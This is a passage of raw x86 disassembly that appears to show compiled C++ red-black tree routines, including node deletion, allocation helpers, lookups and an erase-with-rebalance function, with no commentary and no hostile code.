   138e1:	push   ebx
   138e2:	push   esi
   138e3:	push   edi
   138e4:	mov    edi,DWORD PTR [ebp+0x8]
   138e7:	mov    ebx,ecx
   138e9:	mov    esi,edi
   138eb:	cmp    edi,DWORD PTR ds:0x7f6c8
   138f1:	je     0x13910
   138f3:	push   DWORD PTR [esi+0x8]
   138f6:	mov    ecx,ebx
   138f8:	call   0x138dc
   138fd:	mov    esi,DWORD PTR [esi]
   138ff:	push   edi
   13900:	call   0x10a9a
   13905:	pop    ecx
   13906:	mov    edi,esi
   13908:	cmp    esi,DWORD PTR ds:0x7f6c8
   1390e:	jne    0x138f3
   13910:	pop    edi
   13911:	pop    esi
   13912:	pop    ebx
   13913:	pop    ebp
   13914:	ret    0x4
   13917:	int3   
   13918:	int3   
   13919:	int3   
   1391a:	int3   
   1391b:	int3   
   1391c:	mov    edi,edi
   1391e:	push   ebp
   1391f:	mov    ebp,esp
   13921:	push   ebx
   13922:	push   esi
   13923:	push   edi
   13924:	mov    edi,DWORD PTR [ebp+0x8]
   13927:	mov    ebx,ecx
   13929:	mov    esi,edi
   1392b:	cmp    edi,DWORD PTR ds:0x7f6cc
   13931:	je     0x13950
   13933:	push   DWORD PTR [esi+0x8]
   13936:	mov    ecx,ebx
   13938:	call   0x1391c
   1393d:	mov    esi,DWORD PTR [esi]
   1393f:	push   edi
   13940:	call   0x10a9a
   13945:	pop    ecx
   13946:	mov    edi,esi
   13948:	cmp    esi,DWORD PTR ds:0x7f6cc
   1394e:	jne    0x13933
   13950:	pop    edi
   13951:	pop    esi
   13952:	pop    ebx
   13953:	pop    ebp
   13954:	ret    0x4
   13957:	int3   
   13958:	int3   
   13959:	int3   
   1395a:	int3   
   1395b:	int3   
   1395c:	mov    edi,edi
   1395e:	push   ebp
   1395f:	mov    ebp,esp
   13961:	push   0x0
   13963:	push   0x18
   13965:	call   0x11618
   1396a:	mov    ecx,DWORD PTR [ebp+0x8]
   1396d:	mov    DWORD PTR [eax+0x4],ecx
   13970:	mov    ecx,DWORD PTR [ebp+0xc]
   13973:	mov    DWORD PTR [eax+0x14],ecx
   13976:	pop    ebp
   13977:	ret    0x8
   1397a:	int3   
   1397b:	int3   
   1397c:	int3   
   1397d:	int3   
   1397e:	int3   
   1397f:	int3   
   13980:	mov    edi,edi
   13982:	push   ebp
   13983:	mov    ebp,esp
   13985:	push   0x0
   13987:	push   0x70
   13989:	call   0x11618
   1398e:	mov    ecx,DWORD PTR [ebp+0x8]
   13991:	mov    DWORD PTR [eax+0x4],ecx
   13994:	mov    ecx,DWORD PTR [ebp+0xc]
   13997:	mov    DWORD PTR [eax+0x68],ecx
   1399a:	pop    ebp
   1399b:	ret    0x8
   1399e:	int3   
   1399f:	int3   
   139a0:	int3   
   139a1:	int3   
   139a2:	int3   
   139a3:	int3   
   139a4:	mov    edi,edi
   139a6:	push   ebp
   139a7:	mov    ebp,esp
   139a9:	push   0x0
   139ab:	push   0x14
   139ad:	call   0x11618
   139b2:	mov    ecx,DWORD PTR [ebp+0x8]
   139b5:	mov    DWORD PTR [eax+0x4],ecx
   139b8:	mov    ecx,DWORD PTR [ebp+0xc]
   139bb:	mov    DWORD PTR [eax+0x10],ecx
   139be:	pop    ebp
   139bf:	ret    0x8
   139c2:	int3   
   139c3:	int3   
   139c4:	int3   
   139c5:	int3   
   139c6:	int3   
   139c7:	int3   
   139c8:	mov    edi,edi
   139ca:	push   ebp
   139cb:	mov    ebp,esp
   139cd:	push   0x0
   139cf:	push   0x78
   139d1:	call   0x11618
   139d6:	mov    ecx,DWORD PTR [ebp+0x8]
   139d9:	mov    DWORD PTR [eax+0x4],ecx
   139dc:	mov    ecx,DWORD PTR [ebp+0xc]
   139df:	mov    DWORD PTR [eax+0x70],ecx
   139e2:	pop    ebp
   139e3:	ret    0x8
   139e6:	int3   
   139e7:	int3   
   139e8:	int3   
   139e9:	int3   
   139ea:	int3   
   139eb:	int3   
   139ec:	mov    edi,edi
   139ee:	push   ebp
   139ef:	mov    ebp,esp
   139f1:	push   0x0
   139f3:	push   0x20
   139f5:	call   0x11618
   139fa:	mov    ecx,DWORD PTR [ebp+0x8]
   139fd:	mov    DWORD PTR [eax+0x4],ecx
   13a00:	mov    ecx,DWORD PTR [ebp+0xc]
   13a03:	mov    DWORD PTR [eax+0x1c],ecx
   13a06:	pop    ebp
   13a07:	ret    0x8
   13a0a:	int3   
   13a0b:	int3   
   13a0c:	int3   
   13a0d:	int3   
   13a0e:	int3   
   13a0f:	int3   
   13a10:	mov    edi,edi
   13a12:	push   ebp
   13a13:	mov    ebp,esp
   13a15:	push   esi
   13a16:	push   edi
   13a17:	mov    edi,DWORD PTR [ebp+0x8]
   13a1a:	push   edi
   13a1b:	mov    esi,ecx
   13a1d:	call   0x129aa
   13a22:	add    edi,0x8
   13a25:	push   edi
   13a26:	lea    ecx,[esi+0x8]
   13a29:	call   0x134ba
   13a2e:	pop    edi
   13a2f:	mov    eax,esi
   13a31:	pop    esi
   13a32:	pop    ebp
   13a33:	ret    0x4
   13a36:	int3   
   13a37:	int3   
   13a38:	int3   
   13a39:	int3   
   13a3a:	int3   
   13a3b:	int3   
   13a3c:	mov    edi,edi
   13a3e:	push   ebp
   13a3f:	mov    ebp,esp
   13a41:	push   ecx
   13a42:	push   DWORD PTR [ebp-0x4]
   13a45:	push   DWORD PTR [ebp+0x10]
   13a48:	push   DWORD PTR [ebp+0xc]
   13a4b:	push   DWORD PTR [ebp+0x8]
   13a4e:	call   0x13630
   13a53:	add    esp,0x10
   13a56:	leave  
   13a57:	ret    
   13a58:	int3   
   13a59:	int3   
   13a5a:	int3   
   13a5b:	int3   
   13a5c:	int3   
   13a5d:	int3   
   13a5e:	mov    edi,edi
   13a60:	push   ebp
   13a61:	mov    ebp,esp
   13a63:	push   ecx
   13a64:	push   DWORD PTR [ebp-0x4]
   13a67:	push   DWORD PTR [ebp+0x10]
   13a6a:	push   DWORD PTR [ebp+0xc]
   13a6d:	push   DWORD PTR [ebp+0x8]
   13a70:	call   0x1365a
   13a75:	add    esp,0x10
   13a78:	leave  
   13a79:	ret    
   13a7a:	int3   
   13a7b:	int3   
   13a7c:	int3   
   13a7d:	int3   
   13a7e:	int3   
   13a7f:	int3   
   13a80:	mov    edi,edi
   13a82:	push   ebp
   13a83:	mov    ebp,esp
   13a85:	push   ecx
   13a86:	push   DWORD PTR [ebp-0x4]
   13a89:	push   DWORD PTR [ebp+0x10]
   13a8c:	push   DWORD PTR [ebp+0xc]
   13a8f:	push   DWORD PTR [ebp+0x8]
   13a92:	call   0x13684
   13a97:	add    esp,0x10
   13a9a:	leave  
   13a9b:	ret    
   13a9c:	int3   
   13a9d:	int3   
   13a9e:	int3   
   13a9f:	int3   
   13aa0:	int3   
   13aa1:	int3   
   13aa2:	mov    edi,edi
   13aa4:	push   ebp
   13aa5:	mov    ebp,esp
   13aa7:	push   ecx
   13aa8:	push   DWORD PTR [ebp-0x4]
   13aab:	push   DWORD PTR [ebp+0x10]
   13aae:	push   DWORD PTR [ebp+0xc]
   13ab1:	push   DWORD PTR [ebp+0x8]
   13ab4:	call   0x136ae
   13ab9:	add    esp,0x10
   13abc:	leave  
   13abd:	ret    
   13abe:	int3   
   13abf:	int3   
   13ac0:	int3   
   13ac1:	int3   
   13ac2:	int3   
   13ac3:	int3   
   13ac4:	mov    edi,edi
   13ac6:	push   ebp
   13ac7:	mov    ebp,esp
   13ac9:	mov    ecx,DWORD PTR [ebp+0x8]
   13acc:	test   ecx,ecx
   13ace:	je     0x13ad8
   13ad0:	push   DWORD PTR [ebp+0xc]
   13ad3:	call   0x13a10
   13ad8:	pop    ebp
   13ad9:	ret    0x8
   13adc:	int3   
   13add:	int3   
   13ade:	int3   
   13adf:	int3   
   13ae0:	int3   
   13ae1:	int3   
   13ae2:	mov    edi,edi
   13ae4:	push   ebp
   13ae5:	mov    ebp,esp
   13ae7:	mov    ecx,DWORD PTR [ebp+0x8]
   13aea:	test   ecx,ecx
   13aec:	je     0x13af6
   13aee:	push   DWORD PTR [ebp+0xc]
   13af1:	call   0x134e0
   13af6:	pop    ebp
   13af7:	ret    0x8
   13afa:	int3   
   13afb:	int3   
   13afc:	int3   
   13afd:	int3   
   13afe:	int3   
   13aff:	int3   
   13b00:	mov    edi,edi
   13b02:	push   ebp
   13b03:	mov    ebp,esp
   13b05:	mov    ecx,DWORD PTR [ebp+0x8]
   13b08:	push   0x0
   13b0a:	call   0x1350c
   13b0f:	pop    ebp
   13b10:	ret    0x4
   13b13:	int3   
   13b14:	int3   
   13b15:	int3   
   13b16:	int3   
   13b17:	int3   
   13b18:	mov    edi,edi
   13b1a:	push   ebp
   13b1b:	mov    ebp,esp
   13b1d:	mov    ecx,DWORD PTR [ebp+0x8]
   13b20:	test   ecx,ecx
   13b22:	je     0x13b2c
   13b24:	push   DWORD PTR [ebp+0xc]
   13b27:	call   0x13532
   13b2c:	pop    ebp
   13b2d:	ret    0x8
   13b30:	int3   
   13b31:	int3   
   13b32:	int3   
   13b33:	int3   
   13b34:	int3   
   13b35:	int3   
   13b36:	mov    edi,edi
   13b38:	push   ebp
   13b39:	mov    ebp,esp
   13b3b:	mov    ecx,DWORD PTR [ebp+0x8]
   13b3e:	test   ecx,ecx
   13b40:	je     0x13b4a
   13b42:	push   DWORD PTR [ebp+0xc]
   13b45:	call   0x1355e
   13b4a:	pop    ebp
   13b4b:	ret    0x8
   13b4e:	int3   
   13b4f:	int3   
   13b50:	int3   
   13b51:	int3   
   13b52:	int3   
   13b53:	int3   
   13b54:	mov    edi,edi
   13b56:	push   ebp
   13b57:	mov    ebp,esp
   13b59:	mov    ecx,DWORD PTR [ebp+0x8]
   13b5c:	push   0x0
   13b5e:	call   0x13586
   13b63:	pop    ebp
   13b64:	ret    0x4
   13b67:	int3   
   13b68:	int3   
   13b69:	int3   
   13b6a:	int3   
   13b6b:	int3   
   13b6c:	mov    edi,edi
   13b6e:	push   ebp
   13b6f:	mov    ebp,esp
   13b71:	mov    ecx,DWORD PTR [ebp+0x8]
   13b74:	test   ecx,ecx
   13b76:	je     0x13b80
   13b78:	push   DWORD PTR [ebp+0xc]
   13b7b:	call   0x135b4
   13b80:	pop    ebp
   13b81:	ret    0x8
   13b84:	int3   
   13b85:	int3   
   13b86:	int3   
   13b87:	int3   
   13b88:	int3   
   13b89:	int3   
   13b8a:	mov    edi,edi
   13b8c:	push   ebp
   13b8d:	mov    ebp,esp
   13b8f:	push   ecx
   13b90:	mov    eax,ds:0x7f6cc
   13b95:	push   ebx
   13b96:	mov    ebx,DWORD PTR [ebp+0xc]
   13b99:	push   esi
   13b9a:	mov    esi,DWORD PTR [ebp+0x8]
   13b9d:	mov    DWORD PTR [ebp-0x4],ecx
   13ba0:	mov    DWORD PTR [ebp+0x8],esi
   13ba3:	cmp    esi,eax
   13ba5:	je     0x13bea
   13ba7:	push   edi
   13ba8:	push   DWORD PTR [esi+0x10]
   13bab:	mov    ecx,DWORD PTR [ebp-0x4]
   13bae:	push   ebx
   13baf:	call   0x139a4
   13bb4:	mov    edi,eax
   13bb6:	cmp    DWORD PTR [ebp+0x8],esi
   13bb9:	jne    0x13bbe
   13bbb:	mov    DWORD PTR [ebp+0x8],edi
   13bbe:	mov    ecx,DWORD PTR [ebp-0x4]
   13bc1:	push   edi
   13bc2:	push   DWORD PTR [esi+0x8]
   13bc5:	call   0x13b8a
   13bca:	mov    DWORD PTR [edi+0x8],eax
   13bcd:	lea    eax,[esi+0xc]
   13bd0:	push   eax
   13bd1:	lea    eax,[edi+0xc]
   13bd4:	push   eax
   13bd5:	call   0x1163a
   13bda:	mov    DWORD PTR [ebx],edi
   13bdc:	mov    esi,DWORD PTR [esi]
   13bde:	mov    eax,ds:0x7f6cc
   13be3:	mov    ebx,edi
   13be5:	cmp    esi,eax
   13be7:	jne    0x13ba8
   13be9:	pop    edi
   13bea:	mov    DWORD PTR [ebx],eax
   13bec:	mov    eax,DWORD PTR [ebp+0x8]
   13bef:	pop    esi
   13bf0:	pop    ebx
   13bf1:	leave  
   13bf2:	ret    0x8
   13bf5:	int3   
   13bf6:	int3   
   13bf7:	int3   
   13bf8:	int3   
   13bf9:	int3   
   13bfa:	mov    edi,edi
   13bfc:	push   ebp
   13bfd:	mov    ebp,esp
   13bff:	push   ecx
   13c00:	push   esi
   13c01:	push   edi
   13c02:	mov    edi,DWORD PTR [ebp+0xc]
   13c05:	push   edi
   13c06:	mov    esi,ecx
   13c08:	call   0x12d32
   13c0d:	mov    esi,DWORD PTR [esi+0x4]
   13c10:	mov    DWORD PTR [ebp+0xc],eax
   13c13:	cmp    eax,esi
   13c15:	je     0x13c23
   13c17:	mov    ecx,DWORD PTR [edi]
   13c19:	cmp    ecx,DWORD PTR [eax+0xc]
   13c1c:	jb     0x13c23
   13c1e:	lea    eax,[ebp+0xc]
   13c21:	jmp    0x13c29
   13c23:	mov    DWORD PTR [ebp-0x4],esi
   13c26:	lea    eax,[ebp-0x4]
   13c29:	mov    ecx,DWORD PTR [eax]
   13c2b:	mov    eax,DWORD PTR [ebp+0x8]
   13c2e:	pop    edi
   13c2f:	mov    DWORD PTR [eax],ecx
   13c31:	pop    esi
   13c32:	leave  
   13c33:	ret    0x8
   13c36:	int3   
   13c37:	int3   
   13c38:	int3   
   13c39:	int3   
   13c3a:	int3   
   13c3b:	int3   
   13c3c:	mov    edi,edi
   13c3e:	push   ebp
   13c3f:	mov    ebp,esp
   13c41:	push   ecx
   13c42:	push   esi
   13c43:	push   DWORD PTR [ebp+0xc]
   13c46:	mov    esi,ecx
   13c48:	call   0x12e08
   13c4d:	mov    DWORD PTR [ebp-0x4],eax
   13c50:	cmp    eax,DWORD PTR [esi+0x4]
   13c53:	je     0x13c6a
   13c55:	add    eax,0x10
   13c58:	push   eax
   13c59:	push   DWORD PTR [ebp+0xc]
   13c5c:	call   0x19804
   13c61:	test   al,al
   13c63:	jne    0x13c6a
   13c65:	lea    eax,[ebp-0x4]
   13c68:	jmp    0x13c73
   13c6a:	mov    eax,DWORD PTR [esi+0x4]
   13c6d:	mov    DWORD PTR [ebp+0xc],eax
   13c70:	lea    eax,[ebp+0xc]
   13c73:	mov    ecx,DWORD PTR [eax]
   13c75:	mov    eax,DWORD PTR [ebp+0x8]
   13c78:	mov    DWORD PTR [eax],ecx
   13c7a:	pop    esi
   13c7b:	leave  
   13c7c:	ret    0x8
   13c7f:	int3   
   13c80:	int3   
   13c81:	int3   
   13c82:	int3   
   13c83:	int3   
   13c84:	mov    edi,edi
   13c86:	push   ebp
   13c87:	mov    ebp,esp
   13c89:	push   ecx
   13c8a:	push   esi
   13c8b:	push   DWORD PTR [ebp+0xc]
   13c8e:	mov    esi,ecx
   13c90:	call   0x12e48
   13c95:	mov    DWORD PTR [ebp-0x4],eax
   13c98:	cmp    eax,DWORD PTR [esi+0x4]
   13c9b:	je     0x13cb2
   13c9d:	add    eax,0xc
   13ca0:	push   eax
   13ca1:	push   DWORD PTR [ebp+0xc]
   13ca4:	call   0x19804
   13ca9:	test   al,al
   13cab:	jne    0x13cb2
   13cad:	lea    eax,[ebp-0x4]
   13cb0:	jmp    0x13cbb
   13cb2:	mov    eax,DWORD PTR [esi+0x4]
   13cb5:	mov    DWORD PTR [ebp+0xc],eax
   13cb8:	lea    eax,[ebp+0xc]
   13cbb:	mov    ecx,DWORD PTR [eax]
   13cbd:	mov    eax,DWORD PTR [ebp+0x8]
   13cc0:	mov    DWORD PTR [eax],ecx
   13cc2:	pop    esi
   13cc3:	leave  
   13cc4:	ret    0x8
   13cc7:	int3   
   13cc8:	int3   
   13cc9:	int3   
   13cca:	int3   
   13ccb:	int3   
   13ccc:	mov    edi,edi
   13cce:	push   ebp
   13ccf:	mov    ebp,esp
   13cd1:	push   ecx
   13cd2:	push   esi
   13cd3:	push   edi
   13cd4:	mov    edi,DWORD PTR [ebp+0xc]
   13cd7:	push   edi
   13cd8:	mov    esi,ecx
   13cda:	call   0x12e88
   13cdf:	mov    esi,DWORD PTR [esi+0x4]
   13ce2:	mov    DWORD PTR [ebp+0xc],eax
   13ce5:	cmp    eax,esi
   13ce7:	je     0x13cf5
   13ce9:	mov    ecx,DWORD PTR [edi]
   13ceb:	cmp    ecx,DWORD PTR [eax+0xc]
   13cee:	jl     0x13cf5
   13cf0:	lea    eax,[ebp+0xc]
   13cf3:	jmp    0x13cfb
   13cf5:	mov    DWORD PTR [ebp-0x4],esi
   13cf8:	lea    eax,[ebp-0x4]
   13cfb:	mov    ecx,DWORD PTR [eax]
   13cfd:	mov    eax,DWORD PTR [ebp+0x8]
   13d00:	pop    edi
   13d01:	mov    DWORD PTR [eax],ecx
   13d03:	pop    esi
   13d04:	leave  
   13d05:	ret    0x8
   13d08:	int3   
   13d09:	int3   
   13d0a:	int3   
   13d0b:	int3   
   13d0c:	int3   
   13d0d:	int3   
   13d0e:	mov    edi,edi
   13d10:	push   ebp
   13d11:	mov    ebp,esp
   13d13:	push   ecx
   13d14:	mov    eax,DWORD PTR [ecx]
   13d16:	lea    ecx,[ebp-0x4]
   13d19:	mov    DWORD PTR [ebp-0x4],eax
   13d1c:	call   0x12ef6
   13d21:	mov    eax,DWORD PTR [ebp-0x4]
   13d24:	add    eax,0xc
   13d27:	leave  
   13d28:	ret    
   13d29:	int3   
   13d2a:	int3   
   13d2b:	int3   
   13d2c:	int3   
   13d2d:	int3   
   13d2e:	mov    edi,edi
   13d30:	push   ebp
   13d31:	mov    ebp,esp
   13d33:	push   ecx
   13d34:	push   esi
   13d35:	push   DWORD PTR [ebp+0xc]
   13d38:	mov    esi,ecx
   13d3a:	call   0x1300a
   13d3f:	mov    DWORD PTR [ebp-0x4],eax
   13d42:	cmp    eax,DWORD PTR [esi+0x4]
   13d45:	je     0x13d5c
   13d47:	add    eax,0x10
   13d4a:	push   eax
   13d4b:	push   DWORD PTR [ebp+0xc]
   13d4e:	call   0x19804
   13d53:	test   al,al
   13d55:	jne    0x13d5c
   13d57:	lea    eax,[ebp-0x4]
   13d5a:	jmp    0x13d65
   13d5c:	mov    eax,DWORD PTR [esi+0x4]
   13d5f:	mov    DWORD PTR [ebp+0xc],eax
   13d62:	lea    eax,[ebp+0xc]
   13d65:	mov    ecx,DWORD PTR [eax]
   13d67:	mov    eax,DWORD PTR [ebp+0x8]
   13d6a:	mov    DWORD PTR [eax],ecx
   13d6c:	pop    esi
   13d6d:	leave  
   13d6e:	ret    0x8
   13d71:	int3   
   13d72:	int3   
   13d73:	int3   
   13d74:	int3   
   13d75:	int3   
   13d76:	mov    edi,edi
   13d78:	push   ebp
   13d79:	mov    ebp,esp
   13d7b:	push   ecx
   13d7c:	push   ecx
   13d7d:	push   ebx
   13d7e:	push   esi
   13d7f:	mov    DWORD PTR [ebp-0x4],ecx
   13d82:	push   edi
   13d83:	mov    edi,DWORD PTR [ebp+0xc]
   13d86:	lea    ecx,[ebp+0xc]
   13d89:	call   0x112ca
   13d8e:	mov    esi,DWORD PTR [edi]
   13d90:	mov    eax,ds:0x7f6c8
   13d95:	mov    ebx,edi
   13d97:	mov    DWORD PTR [ebp-0x8],esi
   13d9a:	cmp    esi,eax
   13d9c:	jne    0x13dba
   13d9e:	mov    esi,DWORD PTR [edi+0x8]
   13da1:	mov    eax,DWORD PTR [ebx+0x4]
   13da4:	mov    ecx,DWORD PTR [ebp-0x4]
   13da7:	mov    DWORD PTR [esi+0x4],eax
   13daa:	mov    eax,DWORD PTR [ecx+0x4]
   13dad:	cmp    DWORD PTR [eax+0x4],edi
   13db0:	jne    0x13e2f
   13db2:	mov    DWORD PTR [eax+0x4],esi
   13db5:	jmp    0x13e3d
   13dba:	mov    ecx,DWORD PTR [edi+0x8]
   13dbd:	cmp    ecx,eax
   13dbf:	je     0x13da1
   13dc1:	push   ecx
   13dc2:	call   0x111e0
   13dc7:	mov    ebx,eax
   13dc9:	mov    esi,DWORD PTR [ebx+0x8]
   13dcc:	cmp    ebx,edi
   13dce:	je     0x13da1
   13dd0:	mov    eax,DWORD PTR [ebp-0x8]
   13dd3:	mov    DWORD PTR [eax+0x4],ebx
   13dd6:	mov    eax,DWORD PTR [edi]
   13dd8:	mov    DWORD PTR [ebx],eax
   13dda:	cmp    ebx,DWORD PTR [edi+0x8]
   13ddd:	jne    0x13de4
   13ddf:	mov    DWORD PTR [esi+0x4],ebx
   13de2:	jmp    0x13dfb
   13de4:	mov    eax,DWORD PTR [ebx+0x4]
   13de7:	mov    DWORD PTR [esi+0x4],eax
   13dea:	mov    eax,DWORD PTR [ebx+0x4]
   13ded:	mov    DWORD PTR [eax],esi
   13def:	mov    eax,DWORD PTR [edi+0x8]
   13df2:	mov    DWORD PTR [ebx+0x8],eax
   13df5:	mov    eax,DWORD PTR [edi+0x8]
   13df8:	mov    DWORD PTR [eax+0x4],ebx
   13dfb:	mov    eax,DWORD PTR [ebp-0x4]
   13dfe:	mov    eax,DWORD PTR [eax+0x4]
   13e01:	cmp    DWORD PTR [eax+0x4],edi
   13e04:	jne    0x13e0b
   13e06:	mov    DWORD PTR [eax+0x4],ebx
   13e09:	jmp    0x13e19
   13e0b:	mov    eax,DWORD PTR [edi+0x4]
   13e0e:	cmp    DWORD PTR [eax],edi
   13e10:	jne    0x13e16
   13e12:	mov    DWORD PTR [eax],ebx
   13e14:	jmp    0x13e19
   13e16:	mov    DWORD PTR [eax+0x8],ebx
   13e19:	mov    eax,DWORD PTR [edi+0x4]
   13e1c:	mov    DWORD PTR [ebx+0x4],eax
   13e1f:	mov    eax,DWORD PTR [ebx+0x14]
   13e22:	mov    ecx,DWORD PTR [edi+0x14]
   13e25:	mov    DWORD PTR [ebx+0x14],ecx
   13e28:	mov    DWORD PTR [edi+0x14],eax
   13e2b:	mov    ebx,edi
   13e2d:	jmp    0x13e90
   13e2f:	mov    eax,DWORD PTR [edi+0x4]
   13e32:	cmp    DWORD PTR [eax],edi
   13e34:	jne    0x13e3a
   13e36:	mov    DWORD PTR [eax],esi
   13e38:	jmp    0x13e3d
   13e3a:	mov    DWORD PTR [eax+0x8],esi
   13e3d:	mov    eax,DWORD PTR [ecx+0x4]
   13e40:	mov    DWORD PTR [ebp-0x8],eax
   13e43:	cmp    DWORD PTR [eax],edi
   13e45:	jne    0x13e67
   13e47:	mov    edx,DWORD PTR [edi+0x8]
   13e4a:	cmp    edx,DWORD PTR ds:0x7f6c8
   13e50:	jne    0x13e59
   13e52:	mov    edx,DWORD PTR [edi+0x4]
   13e55:	mov    DWORD PTR [eax],edx
   13e57:	jmp    0x13e67
   13e59:	push   esi
   13e5a:	call   0x111e0
   13e5f:	mov    ecx,DWORD PTR [ebp-0x8]
   13e62:	mov    DWORD PTR [ecx],eax
   13e64:	mov    ecx,DWORD PTR [ebp-0x4]
   13e67:	mov    eax,DWORD PTR [ecx+0x4]
   13e6a:	mov    DWORD PTR [ebp-0x8],eax
   13e6d:	cmp    DWORD PTR [eax+0x8],edi
   13e70:	jne    0x13e90
   13e72:	mov    ecx,DWORD PTR [edi]
   13e74:	cmp    ecx,DWORD PTR ds:0x7f6c8
   13e7a:	jne    0x13e84
   13e7c:	mov    ecx,DWORD PTR [edi+0x4]
   13e7f:	mov    DWORD PTR [eax+0x8],ecx
   13e82:	jmp    0x13e90
   13e84:	push   esi
   13e85:	call   0x111be
   13e8a:	mov    ecx,DWORD PTR [ebp-0x8]
   13e8d:	mov    DWORD PTR [ecx+0x8],eax
   13e90:	xor    edi,edi
   13e92:	inc    edi
   13e93:	cmp    DWORD PTR [ebx+0x14],edi
   13e96:	jne    0x13fad
   13e9c:	jmp    0x13f5b
   13ea1:	cmp    DWORD PTR [esi+0x14],edi
   13ea4:	jne    0x13faa
   13eaa:	mov    eax,DWORD PTR [esi+0x4]
   13ead:	cmp    esi,DWORD PTR [eax]
   13eaf:	jne    0x13f26
   13eb1:	mov    eax,DWORD PTR [eax+0x8]
   13eb4:	cmp    DWORD PTR [eax+0x14],0x0
   13eb8:	jne    0x13ed2
   13eba:	mov    DWORD PTR [eax+0x14],edi
   13ebd:	mov    eax,DWORD PTR [esi+0x4]
   13ec0:	and    DWORD PTR [eax+0x14],0x0
   13ec4:	push   DWORD PTR [esi+0x4]
   13ec7:	call   0x12d6a
   13ecc:	mov    eax,DWORD PTR [esi+0x4]
   13ecf:	mov    eax,DWORD PTR [eax+0x8]
   13ed2:	mov    ecx,DWORD PTR [eax]
   13ed4:	cmp    DWORD PTR [ecx+0x14],edi
   13ed7:	jne    0x13ee1
   13ed9:	mov    ecx,DWORD PTR [eax+0x8]
   13edc:	cmp    DWORD PTR [ecx+0x14],edi
   13edf:	je     0x13f54
   13ee1:	mov    ecx,DWORD PTR [eax+0x8]
   13ee4:	cmp    DWORD PTR [ecx+0x14],edi
   13ee7:	jne    0x13f01
   13ee9:	mov    ecx,DWORD PTR [eax]
   13eeb:	mov    DWORD PTR [ecx+0x14],edi
   13eee:	mov    ecx,DWORD PTR [ebp-0x4]
   13ef1:	and    DWORD PTR [eax+0x14],0x0
   13ef5:	push   eax
   13ef6:	call   0x12db8
   13efb:	mov    eax,DWORD PTR [esi+0x4]
   13efe:	mov    eax,DWORD PTR [eax+0x8]
   13f01:	mov    ecx,DWORD PTR [esi+0x4]
   13f04:	mov    ecx,DWORD PTR [ecx+0x14]
   13f07:	mov    DWORD PTR [eax+0x14],ecx
   13f0a:	mov    ecx,DWORD PTR [esi+0x4]
   13f0d:	mov    DWORD PTR [ecx+0x14],edi
   13f10:	mov    eax,DWORD PTR [eax+0x8]
   13f13:	mov    ecx,DWORD PTR [ebp-0x4]
   13f16:	mov    DWORD PTR [eax+0x14],edi
   13f19:	push   DWORD PTR [esi+0x4]
   13f1c:	call   0x12d6a
   13f21:	jmp    0x13faa
   13f26:	mov    eax,DWORD PTR [eax]
   13f28:	cmp    DWORD PTR [eax+0x14],0x0
   13f2c:	jne    0x13f45
   13f2e:	mov    DWORD PTR [eax+0x14],edi
   13f31:	mov    eax,DWORD PTR [esi+0x4]
   13f34:	and    DWORD PTR [eax+0x14],0x0
   13f38:	push   DWORD PTR [esi+0x4]
   13f3b:	call   0x12db8
   13f40:	mov    eax,DWORD PTR [esi+0x4]
   13f43:	mov    eax,DWORD PTR [eax]
   13f45:	mov    ecx,DWORD PTR [eax+0x8]
   13f48:	cmp    DWORD PTR [ecx+0x14],edi
   13f4b:	jne    0x13f6c
   13f4d:	mov    ecx,DWORD PTR [eax]
   13f4f:	cmp    DWORD PTR [ecx+0x14],edi
   13f52:	jne    0x13f6c
   13f54:	and    DWORD PTR [eax+0x14],0x0
   13f58:	mov    esi,DWORD PTR [esi+0x4]
   13f5b:	mov    ecx,DWORD PTR [ebp-0x4]
   13f5e:	mov    eax,DWORD PTR [ecx+0x4]
   13f61:	cmp    esi,DWORD PTR [eax+0x4]
   13f64:	jne    0x13ea1
   13f6a:	jmp    0x13faa
   13f6c:	mov    ecx,DWORD PTR [eax]
   13f6e:	cmp    DWORD PTR [ecx+0x14],edi
   13f71:	jne    0x13f8b
   13f73:	mov    ecx,DWORD PTR [eax+0x8]
   13f76:	mov    DWORD PTR [ecx+0x14],edi
   13f79:	mov    ecx,DWORD PTR [ebp-0x4]
   13f7c:	and    DWORD PTR [eax+0x14],0x0
   13f80:	push   eax
   13f81:	call   0x12d6a
   13f86:	mov    eax,DWORD PTR [esi+0x4]
   13f89:	mov    eax,DWORD PTR [eax]
   13f8b:	mov    ecx,DWORD PTR [esi+0x4]
   13f8e:	mov    ecx,DWORD PTR [ecx+0x14]
   13f91:	mov    DWORD PTR [eax+0x14],ecx
   13f94:	mov    ecx,DWORD PTR [esi+0x4]
   13f97:	mov    DWORD PTR [ecx+0x14],edi
   13f9a:	mov    eax,DWORD PTR [eax]
   13f9c:	mov    ecx,DWORD PTR [ebp-0x4]
   13f9f:	mov    DWORD PTR [eax+0x14],edi
   13fa2:	push   DWORD PTR [esi+0x4]
   13fa5:	call   0x12db8
   13faa:	mov    DWORD PTR [esi+0x14],edi
   13fad:	push   ebx
   13fae:	call   0x10a9a
   13fb3:	mov    eax,DWORD PTR [ebp-0x4]
   13fb6:	dec    DWORD PTR [eax+0xc]
   13fb9:	mov    eax,DWORD PTR [ebp+0x8]
   13fbc:	pop    ecx
   13fbd:	mov    ecx,DWORD PTR [ebp+0xc]
   13fc0:	pop    edi
   13fc1:	pop    esi
   13fc2:	mov    DWORD PTR [eax],ecx
   13fc4:	pop    ebx
   13fc5:	leave  
   13fc6:	ret    0x8
   13fc9:	int3   
   13fca:	int3   
   13fcb:	int3   
   13fcc:	int3   
   13fcd:	int3   
   13fce:	mov    edi,edi
   13fd0:	push   ebp
   13fd1:	mov    ebp,esp
   13fd3:	push   esi
   13fd4:	push   edi
   13fd5:	push   DWORD PTR [ebp+0xc]
   13fd8:	mov    edi,ecx
   13fda:	call   0x130e8
   13fdf:	push   DWORD PTR [ebp+0xc]
   13fe2:	mov    ecx,edi
   13fe4:	mov    esi,eax
   13fe6:	call   0x12d32
   13feb:	mov    ecx,DWORD PTR [ebp+0x8]
   13fee:	pop    edi
   13fef:	mov    DWORD PTR [ecx],eax
   13ff1:	mov    DWORD PTR [ecx+0x4],esi
   13ff4:	mov    eax,ecx
   13ff6:	pop    esi
   13ff7:	pop    ebp
   13ff8:	ret    0x8
   13ffb:	int3   
   13ffc:	int3   
   13ffd:	int3   
   13ffe:	int3   
   13fff:	int3   
   14000:	mov    edi,edi
   14002:	push   esi
   14003:	push   edi
   14004:	push   0x1
   14006:	xor    edi,edi
   14008:	push   edi
   14009:	mov    esi,ecx
   1400b:	call   0x1395c
   14010:	cmp    DWORD PTR ds:0x7f6c8,edi
   14016:	jne    0x1402d
   14018:	mov    ecx,eax
   1401a:	mov    DWORD PTR ds:0x7f6c8,ecx
